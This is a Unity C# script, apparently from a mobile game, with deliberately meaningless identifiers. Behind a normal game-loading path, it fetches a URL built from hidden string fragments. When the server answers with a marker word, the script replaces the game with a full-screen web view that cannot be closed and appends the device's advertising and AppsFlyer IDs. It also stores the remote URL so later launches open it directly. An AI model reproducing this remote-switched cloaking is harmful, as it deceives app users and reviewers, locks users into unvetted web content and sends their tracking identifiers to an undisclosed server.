using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class dfgsdfgMainManager : MonoBehaviour
{
    public List<string> dfgsdfgLoadString;
    private string idfaInfodfgsdfgKey = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("contextInfodfgsdfgIdfaDataKey", 0) == 1)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string adString, bool trackEnabler, string error) =>
            { idfaInfodfgsdfgKey = adString; });
        }
    }

    private IEnumerator Start()
    {
        yield return new WaitForSeconds(3);
        string data = PlayerPrefs.GetString("tarameters", "");
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("dfgsdfggameDataKey", string.Empty) != string.Empty)
            {
                OndfgsdfgMethod(PlayerPrefs.GetString("dfgsdfggameDataKey"));
            }
            else
            {
                string stringtemp = "";
                foreach (var item in dfgsdfgLoadString)
                {
                    stringtemp += item;
                }
                StartCoroutine(LaunchdfgsdfgGameInitialization(stringtemp, data));
            }
        }
        else
        {
            LoaddfgsdfgGameScene();
        }
    }

    public IEnumerator LaunchdfgsdfgGameInitialization(string inputstring, string inputstring2)
    {
        using (UnityWebRequest dfgsdfginitalizationStatus = UnityWebRequest.Get(inputstring))
        {
            dfgsdfginitalizationStatus.timeout = 4;
            yield return dfgsdfginitalizationStatus.SendWebRequest();
            if (dfgsdfginitalizationStatus.isNetworkError)
            {
                LoaddfgsdfgGameScene();
            }
            else
            {
                try
                {
                    if (dfgsdfginitalizationStatus.result == UnityWebRequest.Result.Success)
                    {
                        if (dfgsdfginitalizationStatus.downloadHandler.text.Contains("sadgsad"))
                        {
                            try
                            {
                                string[] key = dfgsdfginitalizationStatus.downloadHandler.text.Split('|');
                                OndfgsdfgMethod($"{key[0]}?idfa={idfaInfodfgsdfgKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}", Convert.ToInt32(key[1]), Convert.ToInt32(key[2]));
                            }
                            catch
                            {
                                OndfgsdfgMethod($"{dfgsdfginitalizationStatus.downloadHandler.text}?idfa={idfaInfodfgsdfgKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}");
                            }
                        }
                        else
                        {
                            LoaddfgsdfgGameScene();
                        }
                    }
                    else
                    {
                        LoaddfgsdfgGameScene();
                    }
                }
                catch
                {
                    LoaddfgsdfgGameScene();
                }
            }
        }
    }
    
    public void LoaddfgsdfgGameScene()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        Scene tempScene = SceneManager.CreateScene("dfgsdfgLoadingScene");
        Scene currentScene = SceneManager.GetActiveScene();
        SceneManager.SetActiveScene(tempScene);
        GameObject newObject = new GameObject("dfgsdfgLoadingManager");
        newObject.AddComponent<dfgsdfgLoadingManager>();
        SceneManager.UnloadScene(currentScene);
    }

    public void OndfgsdfgMethod(string inputKey, int inputValueFirst = 0, int inputValueSecond = 70)
    {
        var dfgsdfgMainManagerManager = gameObject.AddComponent<UniWebView>();
        dfgsdfgMainManagerManager.SetContentInsetAdjustmentBehavior(UniWebViewContentInsetAdjustmentBehavior.Automatic);
        dfgsdfgMainManagerManager.SetZoomEnabled(true);
        if (inputValueFirst == 0)
        {
            dfgsdfgMainManagerManager.SetShowToolbar(false);
        }
        else
        {
            dfgsdfgMainManagerManager.SetShowToolbar(true, false, false, true);
        }
        dfgsdfgMainManagerManager.SetToolbarDoneButtonText("");
        dfgsdfgMainManagerManager.SetSupportMultipleWindows(true);
        dfgsdfgMainManagerManager.Frame = new Rect(0, inputValueSecond, Screen.width, Screen.height - inputValueSecond);
        dfgsdfgMainManagerManager.OnShouldClose += (view) =>
        {
            return false;
        };
        dfgsdfgMainManagerManager.OnOrientationChanged += (view, orientation) =>
        {
            dfgsdfgMainManagerManager.Frame = new Rect(0, inputValueSecond, Screen.width, Screen.height - inputValueSecond);
        };
        dfgsdfgMainManagerManager.SetSupportMultipleWindows(true);
        dfgsdfgMainManagerManager.OnMultipleWindowOpened += (view, windowId) =>
        {
            dfgsdfgMainManagerManager.SetShowToolbar(true);
        };
        dfgsdfgMainManagerManager.OnMultipleWindowClosed += (view, windowId) =>
        {
            if (inputValueFirst == 0)
            {
                dfgsdfgMainManagerManager.SetShowToolbar(false);
            }
            else
            {
                dfgsdfgMainManagerManager.SetShowToolbar(true, false, false, true);
            }
        };
        dfgsdfgMainManagerManager.SetAllowBackForwardNavigationGestures(true);
        dfgsdfgMainManagerManager.OnPageFinished += (view, statusCode, url) =>
        {
            dfgsdfgMainManagerManager.UpdateFrame();
            if (PlayerPrefs.GetString("dfgsdfggameDataKey", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("dfgsdfggameDataKey", url);
            }
        };
        dfgsdfgMainManagerManager.Load(inputKey);
        dfgsdfgMainManagerManager.Show();
    }
}
